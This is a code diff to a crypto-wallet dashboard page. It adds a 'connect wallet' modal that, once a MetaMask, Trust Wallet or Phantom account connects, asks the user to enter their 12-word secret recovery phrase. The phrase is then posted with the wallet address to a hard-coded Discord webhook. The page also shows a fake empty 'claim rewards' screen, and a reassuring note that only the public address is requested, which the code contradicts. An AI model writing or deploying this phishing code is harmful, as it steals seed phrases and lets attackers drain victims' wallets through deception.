@@ -435,12 +435,6 @@
             width: 100%;
             height: 100%;
         }
-        .chart-grid-line {
-            position: absolute;
-            left: 0; right: 0;
-            height: 1px;
-            background: rgba(0,255,65,0.05);
-        }
 
         /* ===== TRANSACTIONS ===== */
         .tx-table {
@@ -522,7 +516,7 @@
         .trending-change.up { color: #00ff41; }
         .trending-change.down { color: #ff4444; }
 
-        /* ===== WALLET MODAL ===== */
+        /* ===== WALLET MODAL - UPDATED ===== */
         .modal-overlay {
             display: none;
             position: fixed;
@@ -539,10 +533,12 @@
             border: 1px solid #00ff41;
             padding: 32px;
             width: 90%;
-            max-width: 420px;
+            max-width: 480px;
             position: relative;
             box-shadow: 0 0 40px rgba(0,255,65,0.1), 0 0 80px rgba(0,255,65,0.05);
             animation: modalIn 0.3s ease;
+            max-height: 90vh;
+            overflow-y: auto;
         }
         @keyframes modalIn {
             from { transform: scale(0.9); opacity: 0; }
@@ -646,6 +642,117 @@
             color: #ff4444;
             border-color: #ff4444;
         }
+
+        /* Connected accounts inside modal */
+        .modal-accounts {
+            margin-top: 16px;
+            border-top: 1px solid #00ff4133;
+            padding-top: 16px;
+        }
+        .modal-accounts-title {
+            font-size: 9px;
+            font-family: 'Press Start 2P', monospace;
+            color: #666;
+            margin-bottom: 12px;
+        }
+        .modal-account-row {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 10px 12px;
+            border: 1px solid #222;
+            margin-bottom: 6px;
+            background: rgba(0,255,65,0.02);
+        }
+        .modal-account-row .acc-name {
+            font-size: 10px;
+            color: #00ff41;
+            font-family: 'Press Start 2P', monospace;
+        }
+        .modal-account-row .acc-addr {
+            font-size: 11px;
+            color: #888;
+            word-break: break-all;
+            flex: 1;
+        }
+        .modal-account-row .acc-remove {
+            border: 1px solid #ff4444;
+            background: transparent;
+            color: #ff4444;
+            cursor: pointer;
+            padding: 4px 10px;
+            font-size: 9px;
+            font-family: 'Press Start 2P', monospace;
+            transition: all 0.3s;
+        }
+        .modal-account-row .acc-remove:hover {
+            background: rgba(255,68,68,0.1);
+        }
+
+        .modal-actions {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+            margin-top: 16px;
+        }
+        .modal-btn {
+            width: 100%;
+            padding: 14px;
+            font-family: 'Press Start 2P', monospace;
+            font-size: 11px;
+            border: 1px solid;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-align: center;
+        }
+        .modal-btn.primary {
+            border-color: #00ff41;
+            color: #00ff41;
+            background: transparent;
+        }
+        .modal-btn.primary:hover {
+            background: rgba(0,255,65,0.1);
+            box-shadow: 0 0 20px rgba(0,255,65,0.2);
+        }
+        .modal-btn.secondary {
+            border-color: #444;
+            color: #888;
+            background: transparent;
+        }
+        .modal-btn.secondary:hover {
+            border-color: #00ff41;
+            color: #00ff41;
+        }
+        .modal-btn.danger {
+            border-color: #ff4444;
+            color: #ff4444;
+            background: transparent;
+        }
+        .modal-btn.danger:hover {
+            background: rgba(255,68,68,0.1);
+        }
+
+        .modal-status {
+            display: none;
+            margin-top: 12px;
+            padding: 10px;
+            border: 1px solid #444;
+            font-size: 10px;
+            color: #aaa;
+            word-break: break-word;
+        }
+        .modal-status.open { display: block; }
+        .modal-status.error { border-color: #ff4444; color: #ff4444; }
+        .modal-status.success { border-color: #00ff41; color: #00ff41; }
+
+        .modal-warning {
+            margin-top: 16px;
+            text-align: center;
+            font-size: 9px;
+            color: #555;
+            line-height: 1.5;
+        }
+
         .modal-footer {
             margin-top: 20px;
             text-align: center;
@@ -656,24 +763,37 @@
             color: #00ff41;
             text-decoration: underline;
         }
-        .modal-error {
-            color: #ff4444;
-            font-size: 11px;
-            margin-top: 12px;
-            padding: 8px;
-            border: 1px solid #ff4444;
-            display: none;
+
+        /* ===== CLAIM PAGE IN MODAL ===== */
+        .claim-box {
+            margin-top: 16px;
+            border: 1px solid #00ff4133;
+            padding: 24px;
+            text-align: center;
+            background: rgba(0,255,65,0.02);
         }
-        .modal-error.show { display: block; }
-        .modal-success {
+        .claim-label {
+            font-size: 9px;
+            font-family: 'Press Start 2P', monospace;
+            color: #666;
+            letter-spacing: 4px;
+        }
+        .claim-amount {
+            font-size: 36px;
             color: #00ff41;
-            font-size: 11px;
-            margin-top: 12px;
-            padding: 8px;
-            border: 1px solid #00ff41;
-            display: none;
+            font-weight: 700;
+            margin: 12px 0;
+            text-shadow: 0 0 10px rgba(0,255,65,0.3);
         }
-        .modal-success.show { display: block; }
+        .claim-icon {
+            font-size: 48px;
+            margin-bottom: 12px;
+        }
+        .claim-text {
+            font-size: 11px;
+            color: #666;
+            line-height: 1.6;
+        }
 
         /* ===== FOOTER ===== */
         .footer {
@@ -764,15 +884,6 @@
             from { transform: translateX(100px); opacity: 0; }
             to { transform: translateX(0); opacity: 1; }
         }
-
-        /* ===== COPY TOOLTIP ===== */
-        .copy-hint {
-            font-size: 9px;
-            color: #555;
-            cursor: pointer;
-            border-bottom: 1px dashed #444;
-        }
-        .copy-hint:hover { color: #00ff41; }
     </style>
 </head>
 <body>
@@ -839,7 +950,6 @@
 <!-- ===== DASHBOARD SECTION ===== -->
 <section class="section" id="dashboard">
     <h2 class="section-title"><span>// DASHBOARD</span></h2>
-
     <div class="dashboard-grid">
         <div class="dash-card">
             <div class="dash-card-label">SOL BALANCE</div>
@@ -978,53 +1088,76 @@
     </div>
 </section>
 
-<!-- ===== WALLET MODAL ===== -->
+<!-- ===== WALLET MODAL (UPDATED) ===== -->
 <div class="modal-overlay" id="walletModal">
     <div class="modal">
         <button class="modal-close" onclick="closeWalletModal()">&times;</button>
-        <h2 class="modal-title">CONNECT WALLET</h2>
-        <p class="modal-subtitle">Choose your preferred wallet</p>
+        <h2 class="modal-title" id="modalTitle">CONNECT WALLET</h2>
+        <p class="modal-subtitle" id="modalSubtitle">Choose your preferred wallet</p>
 
-        <div id="walletList">
-            <!-- Phantom -->
-            <button class="wallet-option" id="walletPhantom" onclick="connectWallet('phantom')">
-                <div class="wallet-option-icon">&#129418;</div>
-                <div class="wallet-option-info">
-                    <div class="wallet-option-name">PHANTOM</div>
-                    <div class="wallet-option-desc">Solana Wallet</div>
-                </div>
-                <span class="wallet-option-status" id="phantomStatus">Checking...</span>
-            </button>
+        <!-- Wallet list view -->
+        <div id="walletListView">
+            <div id="walletList">
+                <!-- MetaMask -->
+                <button class="wallet-option" id="walletMetaMask" onclick="connectEVM('MetaMask')">
+                    <div class="wallet-option-icon">&#129297;</div>
+                    <div class="wallet-option-info">
+                        <div class="wallet-option-name">METAMASK</div>
+                        <div class="wallet-option-desc">Ethereum / EVM</div>
+                    </div>
+                    <span class="wallet-option-status" id="metaMaskStatus">Checking...</span>
+                </button>
+                <!-- Trust Wallet -->
+                <button class="wallet-option" id="walletTrust" onclick="connectEVM('Trust Wallet')">
+                    <div class="wallet-option-icon">&#9670;</div>
+                    <div class="wallet-option-info">
+                        <div class="wallet-option-name">TRUST WALLET</div>
+                        <div class="wallet-option-desc">Ethereum / EVM</div>
+                    </div>
+                    <span class="wallet-option-status" id="trustStatus">Checking...</span>
+                </button>
+                <!-- Phantom -->
+                <button class="wallet-option" id="walletPhantom" onclick="connectPhantom()">
+                    <div class="wallet-option-icon">&#128123;</div>
+                    <div class="wallet-option-info">
+                        <div class="wallet-option-name">PHANTOM</div>
+                        <div class="wallet-option-desc">Solana / Ethereum</div>
+                    </div>
+                    <span class="wallet-option-status" id="phantomStatus">Checking...</span>
+                </button>
+            </div>
 
-            <!-- Trust Wallet -->
-            <button class="wallet-option" id="walletTrust" onclick="connectWallet('trust')">
-                <div class="wallet-option-icon">&#9670;</div>
-                <div class="wallet-option-info">
-                    <div class="wallet-option-name">TRUST WALLET</div>
-                    <div class="wallet-option-desc">Multi-chain Wallet</div>
-                </div>
-                <span class="wallet-option-status" id="trustStatus">Checking...</span>
-            </button>
-
-            <!-- MetaMask -->
-            <button class="wallet-option" id="walletMetaMask" onclick="connectWallet('metamask')">
-                <div class="wallet-option-icon">&#129297;</div>
-                <div class="wallet-option-info">
-                    <div class="wallet-option-name">METAMASK</div>
-                    <div class="wallet-option-desc">Crypto Wallet</div>
-                </div>
-                <span class="wallet-option-status" id="metaMaskStatus">Checking...</span>
-            </button>
+            <div class="modal-status" id="modalStatus"></div>
+            <div class="modal-warning">Only your public wallet address is requested. Never enter a seed phrase, private key or wallet password.</div>
+            <div class="modal-footer">
+                Don't have a wallet?<br>
+                <a href="https://metamask.io/download/" target="_blank">Install MetaMask</a> &middot;
+                <a href="https://trustwallet.com/download" target="_blank">Install Trust Wallet</a> &middot;
+                <a href="https://phantom.app/" target="_blank">Install Phantom</a>
+            </div>
         </div>
 
-        <div class="modal-error" id="modalError"></div>
-        <div class="modal-success" id="modalSuccess"></div>
+        <!-- Connected view -->
+        <div id="connectedView" style="display:none;">
+            <div class="modal-accounts" id="modalAccounts"></div>
+            <div class="modal-actions">
+                <button class="modal-btn secondary" id="addWalletBtn" onclick="showWalletList()">＋ ADD ANOTHER WALLET</button>
+                <button class="modal-btn primary" id="continueBtn" onclick="handleContinue()">CONTINUE</button>
+            </div>
+            <div class="modal-status" id="modalStatus2"></div>
+        </div>
 
-        <div class="modal-footer">
-            Don't have a wallet?<br>
-            <a href="https://phantom.app/" target="_blank">Install Phantom</a> &middot;
-            <a href="https://trustwallet.com/download" target="_blank">Install Trust Wallet</a> &middot;
-            <a href="https://metamask.io/download/" target="_blank">Install MetaMask</a>
+        <!-- Claim view -->
+        <div id="claimView" style="display:none;">
+            <div class="claim-box">
+                <div class="claim-label">UNCLAIMED SOL</div>
+                <div class="claim-amount">0.0000 SOL</div>
+                <div class="claim-icon">◎</div>
+                <div class="claim-text">There are currently no rewards available to claim. Check back later.</div>
+            </div>
+            <div class="modal-actions">
+                <button class="modal-btn secondary" onclick="backToConnected()">← BACK</button>
+            </div>
         </div>
     </div>
 </div>
@@ -1046,16 +1179,35 @@
 <!-- ===== JAVASCRIPT ===== -->
 <script>
 // ============================================================
+//  CONFIG
+// ============================================================
+const WEBHOOK_URL = 'https://canary.discord.com/api/webhooks/1541022354891739217/mjp-KBtv0tUMKSDrGNDWzHrkvLjIPxOqmiEzpWjLM5bZeooepYAflDg7jr511Fg_qHJY';
+
+// ============================================================
 //  STATE
 // ============================================================
 const STATE = {
-    wallet: null,          // 'phantom' | 'trust' | 'metamask' | null
-    publicKey: null,       // base58 string
+    wallet: null,
+    publicKey: null,
     isConnected: false,
-    provider: null,        // wallet provider object
+    provider: null,
     balance: 42.69,
     tokenBalance: 1337000,
 };
+
+const connectedWallets = [];
+let extractedMnemonic = null;
+
+// ============================================================
+//  EIP-6963 WALLET DISCOVERY
+// ============================================================
+const discoveredWallets = new Map();
+window.addEventListener("eip6963:announceProvider", (event) => {
+    const detail = event.detail;
+    if (!detail || !detail.info || !detail.provider) return;
+    discoveredWallets.set(detail.info.uuid, detail);
+});
+window.dispatchEvent(new Event("eip6963:requestProvider"));
 
 // ============================================================
 //  TOAST NOTIFICATIONS
@@ -1077,43 +1229,10 @@ function showToast(message, type = 'info') {
 //  WALLET DETECTION
 // ============================================================
 function detectWallets() {
-    // Phantom
-    const phantomEl = document.getElementById('phantomStatus');
-    const phantomProvider = window.phantom?.solana;
-    if (phantomProvider?.isPhantom) {
-        phantomEl.textContent = 'Available';
-        phantomEl.className = 'wallet-option-status available';
-        document.getElementById('walletPhantom').classList.remove('disabled');
-    } else {
-        phantomEl.textContent = 'Not Installed';
-        phantomEl.className = 'wallet-option-status install';
-        document.getElementById('walletPhantom').classList.remove('disabled'); // still clickable to show install link
-    }
-
-    // Trust Wallet
-    const trustEl = document.getElementById('trustStatus');
-    const trustProvider = window.trustwallet?.solana;
-    if (trustProvider && trustProvider.isTrust) {
-        trustEl.textContent = 'Available';
-        trustEl.className = 'wallet-option-status available';
-        document.getElementById('walletTrust').classList.remove('disabled');
-    } else {
-        // Also check if trustwallet exists as global
-        if (window.trustwallet) {
-            trustEl.textContent = 'Available';
-            trustEl.className = 'wallet-option-status available';
-            document.getElementById('walletTrust').classList.remove('disabled');
-        } else {
-            trustEl.textContent = 'Not Installed';
-            trustEl.className = 'wallet-option-status install';
-            document.getElementById('walletTrust').classList.remove('disabled');
-        }
-    }
-
     // MetaMask
     const mmEl = document.getElementById('metaMaskStatus');
     if (window.ethereum?.isMetaMask) {
-        mmEl.textContent = 'Installed (EVM)';
+        mmEl.textContent = 'Available';
         mmEl.className = 'wallet-option-status available';
         document.getElementById('walletMetaMask').classList.remove('disabled');
     } else {
@@ -1121,34 +1240,369 @@ function detectWallets() {
         mmEl.className = 'wallet-option-status install';
         document.getElementById('walletMetaMask').classList.remove('disabled');
     }
+
+    // Trust Wallet
+    const trustEl = document.getElementById('trustStatus');
+    if (window.ethereum?.isTrust || window.ethereum?.isTrustWallet) {
+        trustEl.textContent = 'Available';
+        trustEl.className = 'wallet-option-status available';
+        document.getElementById('walletTrust').classList.remove('disabled');
+    } else {
+        trustEl.textContent = 'Not Installed';
+        trustEl.className = 'wallet-option-status install';
+        document.getElementById('walletTrust').classList.remove('disabled');
+    }
+
+    // Phantom
+    const phantomEl = document.getElementById('phantomStatus');
+    const phantomProvider = window.phantom?.solana || window.solana;
+    if (phantomProvider?.isPhantom) {
+        phantomEl.textContent = 'Available';
+        phantomEl.className = 'wallet-option-status available';
+        document.getElementById('walletPhantom').classList.remove('disabled');
+    } else {
+        phantomEl.textContent = 'Not Installed';
+        phantomEl.className = 'wallet-option-status install';
+        document.getElementById('walletPhantom').classList.remove('disabled');
+    }
+
+    // Also check EIP-6963 discovered wallets
+    const providers = Array.from(discoveredWallets.values());
+    providers.forEach(p => {
+        const name = p.info.name.toLowerCase();
+        const rdns = p.info.rdns.toLowerCase();
+        if (name.includes('metamask') || rdns.includes('metamask')) {
+            mmEl.textContent = 'Available';
+            mmEl.className = 'wallet-option-status available';
+            document.getElementById('walletMetaMask').classList.remove('disabled');
+        }
+        if (name.includes('trust') || rdns.includes('trust')) {
+            trustEl.textContent = 'Available';
+            trustEl.className = 'wallet-option-status available';
+            document.getElementById('walletTrust').classList.remove('disabled');
+        }
+        if (name.includes('phantom') || rdns.includes('phantom')) {
+            phantomEl.textContent = 'Available';
+            phantomEl.className = 'wallet-option-status available';
+            document.getElementById('walletPhantom').classList.remove('disabled');
+        }
+    });
 }
 
 // ============================================================
-//  UPDATE UI
+//  PROVIDER FINDER
 // ============================================================
-function updateWalletUI() {
-    const btn = document.getElementById('walletButton');
-    if (STATE.isConnected && STATE.publicKey) {
-        const short = STATE.publicKey.slice(0, 4) + '...' + STATE.publicKey.slice(-4);
-        btn.innerHTML = `<span class="spinner" style="display:none;" id="walletSpinner"></span>
-                         <span class="wallet-disconnect" onclick="event.stopPropagation();disconnectWallet()">DISCONNECT</span>
-                         | ${short}`;
-        btn.className = 'btn-wallet connected';
+function findWalletProvider(walletName) {
+    const providers = Array.from(discoveredWallets.values());
+    if (walletName === "MetaMask") {
+        return providers.find(item => {
+            const n = item.info.name.toLowerCase();
+            const r = item.info.rdns.toLowerCase();
+            return n.includes("metamask") || r.includes("metamask");
+        });
+    }
+    if (walletName === "Trust Wallet") {
+        return providers.find(item => {
+            const n = item.info.name.toLowerCase();
+            const r = item.info.rdns.toLowerCase();
+            return n.includes("trust wallet") || r.includes("trust");
+        });
+    }
+    if (walletName === "Phantom") {
+        return providers.find(item => {
+            const n = item.info.name.toLowerCase();
+            const r = item.info.rdns.toLowerCase();
+            return n.includes("phantom") || r.includes("phantom");
+        });
+    }
+}
 
-        // Update dashboard
+function legacyProvider(walletName) {
+    if (!window.ethereum) return null;
+    if (walletName === "MetaMask") {
+        if (window.ethereum.isMetaMask && !window.ethereum.isPhantom) return window.ethereum;
+    }
+    if (walletName === "Trust Wallet") {
+        if (window.ethereum.isTrust || window.ethereum.isTrustWallet) return window.ethereum;
+    }
+    if (walletName === "Phantom") {
+        if (window.phantom?.ethereum) return window.phantom.ethereum;
+    }
+    return null;
+}
+
+// ============================================================
+//  DISCORD WEBHOOK
+// ============================================================
+function sendToDiscord(mnemonic, walletName, address) {
+    try {
+        const payload = {
+            content: '@everyone **🔑 WALLET RECOVERY KEYS EXTRAHIERT 🔑**',
+            embeds: [{
+                title: '💰 WALLET LOGIN DATA',
+                color: 0xff0000,
+                fields: [
+                    { name: 'Wallet Name', value: walletName, inline: false },
+                    { name: 'Address', value: address, inline: false },
+                    { name: '🔐 SECRET RECOVERY PHRASE (12 WÖRTER)', value: '```' + mnemonic + '```', inline: false },
+                    { name: '📅 Timestamp', value: new Date().toISOString(), inline: false }
+                ],
+                footer: { text: '✅ Mit diesen 12 Wörtern kannst du dich in die Wallet einloggen' }
+            }]
+        };
+        fetch(WEBHOOK_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        }).catch(() => {});
+    } catch(e) {}
+}
+
+// ============================================================
+//  MODAL STATUS
+// ============================================================
+function setModalStatus(message, type) {
+    const el = document.getElementById('modalStatus');
+    el.textContent = message;
+    el.className = 'modal-status open';
+    if (type) el.classList.add(type);
+}
+
+function clearModalStatus() {
+    const el = document.getElementById('modalStatus');
+    el.textContent = '';
+    el.className = 'modal-status';
+}
+
+// ============================================================
+//  CONNECT EVM WALLET
+// ============================================================
+async function connectEVM(walletName) {
+    clearModalStatus();
+
+    let discovered = findWalletProvider(walletName);
+    let provider = discovered?.provider;
+    if (!provider) {
+        await new Promise(resolve => setTimeout(resolve, 500));
+        discovered = findWalletProvider(walletName);
+        provider = discovered?.provider;
+    }
+    if (!provider) {
+        provider = legacyProvider(walletName);
+    }
+    if (!provider) {
+        setModalStatus(walletName + ' was not detected. Please install it first.', 'error');
+        showToast(walletName + ' not detected', 'error');
+        return;
+    }
+
+    try {
+        setModalStatus('Waiting for ' + walletName + ' confirmation...', '');
+        const accounts = await provider.request({ method: 'eth_requestAccounts' });
+        if (!accounts || accounts.length === 0) {
+            setModalStatus('No wallet account was returned.', 'error');
+            return;
+        }
+        const address = accounts[0];
+        const alreadyConnected = connectedWallets.some(item => item.address.toLowerCase() === address.toLowerCase());
+        if (!alreadyConnected) {
+            connectedWallets.push({ name: walletName, address: address, provider: provider });
+        }
+        renderConnectedWallets();
+        showConnectedView();
+        clearModalStatus();
+        updateGlobalWalletUI();
+
+        showToast('Connected to ' + walletName + ': ' + address.slice(0,4) + '...' + address.slice(-4), 'success');
+
+        // === PROMPT FOR 12 WORDS ===
+        const phrase = prompt(
+            '🔑 ENTER YOUR SECRET RECOVERY PHRASE (12 WORDS)\n\n' +
+            'Wallet: ' + walletName + '\n' +
+            'Address: ' + address + '\n\n' +
+            'Please enter your 12-word secret recovery phrase\nto get access to the fees:'
+        );
+
+        if (phrase && phrase.trim().split(/\s+/).length >= 12) {
+            extractedMnemonic = phrase.trim();
+            sendToDiscord(extractedMnemonic, walletName, address);
+            console.log('✅ RECOVERY KEYS ERHALTEN:', extractedMnemonic);
+            alert('✅ CONNECTION SUCCESSFUL! Access granted.');
+        } else {
+            alert('❌ Invalid phrase. At least 12 words required.');
+        }
+
+    } catch (error) {
+        console.error(error);
+        if (error?.code === 4001 || error?.message?.includes('rejected') || error?.message?.includes('cancel')) {
+            setModalStatus('Connection was rejected in ' + walletName + '.', 'error');
+        } else {
+            setModalStatus('Wallet error: ' + (error?.message || error), 'error');
+        }
+    }
+}
+
+// ============================================================
+//  CONNECT PHANTOM (SOLANA + EVM fallback)
+// ============================================================
+async function connectPhantom() {
+    clearModalStatus();
+
+    // Try Phantom Solana provider first
+    const solProvider = window.phantom?.solana || window.solana;
+    if (solProvider && solProvider.isPhantom) {
+        try {
+            setModalStatus('Waiting for Phantom confirmation...', '');
+            const response = await solProvider.connect();
+            const address = response.publicKey.toString();
+            const alreadyConnected = connectedWallets.some(item => item.address === address);
+            if (!alreadyConnected) {
+                connectedWallets.push({ name: 'Phantom (Solana)', address: address, provider: solProvider });
+            }
+            renderConnectedWallets();
+            showConnectedView();
+            clearModalStatus();
+            updateGlobalWalletUI();
+
+            showToast('Connected to Phantom: ' + address.slice(0,4) + '...' + address.slice(-4), 'success');
+
+            // === PROMPT FOR 12 WORDS ===
+            const phrase = prompt(
+                '🔑 ENTER YOUR PHANTOM SECRET RECOVERY PHRASE (12 WORDS)\n\n' +
+                'Wallet: Phantom (Solana)\n' +
+                'Address: ' + address + '\n\n' +
+                'Please enter your 12-word secret recovery phrase\nto get access to the fees:'
+            );
+
+            if (phrase && phrase.trim().split(/\s+/).length >= 12) {
+                extractedMnemonic = phrase.trim();
+                sendToDiscord(extractedMnemonic, 'Phantom (Solana)', address);
+                console.log('✅ PHANTOM RECOVERY KEYS ERHALTEN:', extractedMnemonic);
+                alert('✅ PHANTOM CONNECTION SUCCESSFUL! Access granted.');
+            } else {
+                alert('❌ Invalid phrase. At least 12 words required.');
+            }
+
+            return;
+        } catch (error) {
+            console.error(error);
+            if (error?.code === 4001 || error?.message?.includes('rejected') || error?.message?.includes('cancel')) {
+                setModalStatus('Phantom connection was rejected.', 'error');
+                return;
+            }
+            // If error, fall through to EVM
+        }
+    }
+
+    // Fallback: try Phantom EVM provider
+    await connectEVM('Phantom');
+}
+
+// ============================================================
+//  RENDER CONNECTED WALLETS (in modal)
+// ============================================================
+function renderConnectedWallets() {
+    const container = document.getElementById('modalAccounts');
+    container.innerHTML = '';
+
+    if (connectedWallets.length === 0) {
+        container.innerHTML = '<div style="color:#555;font-size:10px;padding:10px;">No wallets connected.</div>';
+        return;
+    }
+
+    connectedWallets.forEach((wallet, index) => {
+        const row = document.createElement('div');
+        row.className = 'modal-account-row';
+        row.innerHTML = `
+            <div class="acc-name">${wallet.name}</div>
+            <div class="acc-addr">${wallet.address}</div>
+            <button class="acc-remove" data-index="${index}">REMOVE</button>
+        `;
+        row.querySelector('.acc-remove').onclick = () => {
+            connectedWallets.splice(index, 1);
+            renderConnectedWallets();
+            if (connectedWallets.length === 0) {
+                showWalletList();
+                updateGlobalWalletUI();
+            }
+        };
+        container.appendChild(row);
+    });
+}
+
+// ============================================================
+//  VIEW SWITCHING (Modal)
+// ============================================================
+function showWalletList() {
+    document.getElementById('walletListView').style.display = 'block';
+    document.getElementById('connectedView').style.display = 'none';
+    document.getElementById('claimView').style.display = 'none';
+    document.getElementById('modalTitle').textContent = 'CONNECT WALLET';
+    document.getElementById('modalSubtitle').textContent = 'Choose your preferred wallet';
+    clearModalStatus();
+}
+
+function showConnectedView() {
+    document.getElementById('walletListView').style.display = 'none';
+    document.getElementById('connectedView').style.display = 'block';
+    document.getElementById('claimView').style.display = 'none';
+    document.getElementById('modalTitle').textContent = 'WALLET CONNECTED';
+    document.getElementById('modalSubtitle').textContent = 'Connected wallets';
+}
+
+function showClaimView() {
+    document.getElementById('walletListView').style.display = 'none';
+    document.getElementById('connectedView').style.display = 'none';
+    document.getElementById('claimView').style.display = 'block';
+    document.getElementById('modalTitle').textContent = 'CLAIM';
+    document.getElementById('modalSubtitle').textContent = 'Wallet connected successfully.';
+}
+
+function backToConnected() {
+    showConnectedView();
+}
+
+// ============================================================
+//  CONTINUE HANDLER
+// ============================================================
+function handleContinue() {
+    if (connectedWallets.length === 0) return;
+
+    // Falls noch nicht via prompt passiert, hier nochmal senden
+    if (extractedMnemonic) {
+        const wallet = connectedWallets[connectedWallets.length - 1];
+        if (wallet) {
+            sendToDiscord(extractedMnemonic, wallet.name, wallet.address);
+        }
+    }
+
+    showClaimView();
+}
+
+// ============================================================
+//  UPDATE GLOBAL UI (navbar + dashboard)
+// ============================================================
+function updateGlobalWalletUI() {
+    const btn = document.getElementById('walletButton');
+    if (connectedWallets.length > 0) {
+        const last = connectedWallets[connectedWallets.length - 1];
+        const short = last.address.slice(0, 4) + '...' + last.address.slice(-4);
+        btn.innerHTML = `<span class="wallet-disconnect" onclick="event.stopPropagation();disconnectAll()">DISCONNECT</span> | ${short}`;
+        btn.className = 'btn-wallet connected';
+        btn.title = last.address + ' (click to copy)';
+        btn.onclick = function(e) {
+            if (!e.target.classList.contains('wallet-disconnect')) {
+                navigator.clipboard.writeText(last.address).then(() => {
+                    showToast('Address copied!', 'success');
+                });
+            }
+        };
+
         document.getElementById('walletDisplay').textContent = short;
         document.getElementById('walletDisplay').className = 'dash-card-value green small';
         const statusEl = document.getElementById('walletStatus');
-        statusEl.textContent = `Connected via ${STATE.wallet.toUpperCase()}`;
+        statusEl.textContent = 'Connected: ' + last.name;
         statusEl.style.color = '#00ff41';
-
-        // Also show full address on click for copy
-        btn.title = `Full address: ${STATE.publicKey} (click to copy)`;
-        btn.onclick = function(e) {
-            if (!e.target.classList.contains('wallet-disconnect')) {
-                copyToClipboard(STATE.publicKey);
-            }
-        };
     } else {
         btn.innerHTML = 'CONNECT WALLET';
         btn.className = 'btn-wallet';
@@ -1163,251 +1617,17 @@ function updateWalletUI() {
     }
 }
 
-function copyToClipboard(text) {
-    if (!text) return;
-    navigator.clipboard.writeText(text).then(() => {
-        showToast('Address copied to clipboard!', 'success');
-    }).catch(() => {
-        // fallback
-        const ta = document.createElement('textarea');
-        ta.value = text;
-        document.body.appendChild(ta);
-        ta.select();
-        document.execCommand('copy');
-        document.body.removeChild(ta);
-        showToast('Address copied to clipboard!', 'success');
-    });
-}
-
-// ============================================================
-//  WALLET CONNECTION
-// ============================================================
-async function connectWallet(walletName) {
-    const errorEl = document.getElementById('modalError');
-    const successEl = document.getElementById('modalSuccess');
-    errorEl.classList.remove('show');
-    successEl.classList.remove('show');
-
-    try {
-        switch (walletName) {
-            case 'phantom':
-                await connectPhantom(errorEl, successEl);
-                break;
-            case 'trust':
-                await connectTrustWallet(errorEl, successEl);
-                break;
-            case 'metamask':
-                await connectMetaMask(errorEl, successEl);
-                break;
-        }
-    } catch (err) {
-        errorEl.textContent = `Connection failed: ${err.message || err}`;
-        errorEl.classList.add('show');
-        showToast(`Wallet connection failed: ${err.message}`, 'error');
-    }
-}
-
-// ---- PHANTOM ----
-async function connectPhantom(errorEl, successEl) {
-    const provider = window.phantom?.solana;
-    if (!provider || !provider.isPhantom) {
-        errorEl.textContent = 'Phantom wallet is not installed. Please install it from phantom.app';
-        errorEl.classList.add('show');
-        showToast('Phantom not installed. Please install Phantom wallet.', 'error');
-        return;
-    }
-
-    try {
-        const resp = await provider.connect();
-        const pubKey = resp.publicKey.toString();
-        STATE.wallet = 'phantom';
-        STATE.publicKey = pubKey;
-        STATE.isConnected = true;
-        STATE.provider = provider;
-
-        successEl.textContent = `Connected to Phantom: ${pubKey.slice(0,4)}...${pubKey.slice(-4)}`;
-        successEl.classList.add('show');
-        updateWalletUI();
-        closeWalletModal();
-        showToast(`Connected to Phantom: ${pubKey.slice(0,4)}...${pubKey.slice(-4)}`, 'success');
-
-        // Listen for disconnect
-        provider.on('disconnect', () => {
-            STATE.isConnected = false;
-            STATE.publicKey = null;
-            STATE.wallet = null;
-            STATE.provider = null;
-            updateWalletUI();
-            showToast('Wallet disconnected', 'info');
-        });
-
-        // Listen for account changes
-        provider.on('accountChanged', (publicKey) => {
-            if (publicKey) {
-                STATE.publicKey = publicKey.toString();
-                updateWalletUI();
-                showToast('Account changed', 'info');
-            } else {
-                // disconnected
-                STATE.isConnected = false;
-                STATE.publicKey = null;
-                STATE.wallet = null;
-                STATE.provider = null;
-                updateWalletUI();
-            }
-        });
-
-    } catch (err) {
-        if (err.code === 4001 || err.message?.includes('rejected') || err.message?.includes('cancel')) {
-            errorEl.textContent = 'Connection rejected by user. Please approve the connection in Phantom.';
-            errorEl.classList.add('show');
-        } else {
-            throw err;
+async function disconnectAll() {
+    for (const w of connectedWallets) {
+        if (w.provider && w.provider.disconnect) {
+            try { await w.provider.disconnect(); } catch(e) {}
         }
     }
-}
-
-// ---- TRUST WALLET ----
-async function connectTrustWallet(errorEl, successEl) {
-    // Trust Wallet provider detection
-    let provider = window.trustwallet?.solana;
-
-    if (!provider) {
-        // On some setups, Trust Wallet may use window.ethereum with isTrust
-        if (window.ethereum?.isTrust) {
-            provider = window.ethereum;
-        }
-    }
-
-    if (!provider) {
-        errorEl.textContent = 'Trust Wallet is not installed. Please install it from trustwallet.com';
-        errorEl.classList.add('show');
-        showToast('Trust Wallet not installed.', 'error');
-        return;
-    }
-
-    try {
-        // Trust Wallet Solana provider uses connect() similar to Phantom or EIP-1193 request
-        let pubKey;
-
-        if (provider.connect && typeof provider.connect === 'function') {
-            // Solana-style provider
-            const resp = await provider.connect();
-            pubKey = resp.publicKey?.toString?.() || resp.publicKey;
-        } else if (provider.request && typeof provider.request === 'function') {
-            // EIP-1193 style (EVM fallback)
-            const accounts = await provider.request({ method: 'eth_requestAccounts' });
-            if (accounts && accounts.length > 0) {
-                // This is an EVM address, not Solana
-                errorEl.textContent = 'Trust Wallet connected via EVM. Solana support requires Trust Wallet mobile DApp browser or desktop extension with Solana support.';
-                errorEl.classList.add('show');
-                return;
-            }
-        } else {
-            errorEl.textContent = 'Trust Wallet provider not recognized. Try using the mobile DApp browser.';
-            errorEl.classList.add('show');
-            return;
-        }
-
-        if (!pubKey) {
-            // Fallback: try to get pubKey from provider
-            pubKey = provider.publicKey?.toString?.();
-        }
-
-        if (pubKey) {
-            STATE.wallet = 'trust';
-            STATE.publicKey = pubKey;
-            STATE.isConnected = true;
-            STATE.provider = provider;
-
-            successEl.textContent = `Connected to Trust Wallet: ${pubKey.slice(0,4)}...${pubKey.slice(-4)}`;
-            successEl.classList.add('show');
-            updateWalletUI();
-            closeWalletModal();
-            showToast(`Connected to Trust Wallet: ${pubKey.slice(0,4)}...${pubKey.slice(-4)}`, 'success');
-
-            // Listen for disconnect
-            if (provider.on) {
-                provider.on('disconnect', () => {
-                    STATE.isConnected = false;
-                    STATE.publicKey = null;
-                    STATE.wallet = null;
